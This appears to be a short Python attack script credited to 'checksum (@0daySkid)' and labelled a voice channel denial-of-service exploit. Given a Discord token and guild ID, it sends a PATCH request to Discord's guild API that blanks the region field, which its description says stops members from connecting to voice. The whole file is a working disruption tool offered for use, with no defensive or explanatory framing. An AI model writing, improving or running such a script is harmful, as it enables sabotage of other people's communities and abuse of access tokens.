# Name: Guild Voice Channel Denial of Service
# Description: Sets the guild region to unknown, which makes members unable to connect to the voice channel
# Author: checksum (@0daySkid)
# Original founder: HellSec

import requests
import random
import sys


class Exploit:

    def __init__(self, token, guild):
        self.token = token
        self.guild_id = guild
        self.headers = {'Authorization': token}

    def execute(self):
        """ send region change request """
        return requests.patch(f'https://discord.com/api/v8/guilds/{self.guild_id}', headers=self.headers, json={'region': ''})


def main():
    if len(sys.argv) < 3:
        print(f'Usage: py {sys.argv[0]} <token> <guild id>')
        sys.exit()

    token = sys.argv[1]
    guild_id = sys.argv[2]

    exploit = Exploit(token, guild_id)

    exploit.execute()


if __name__ == '__main__':
    main()
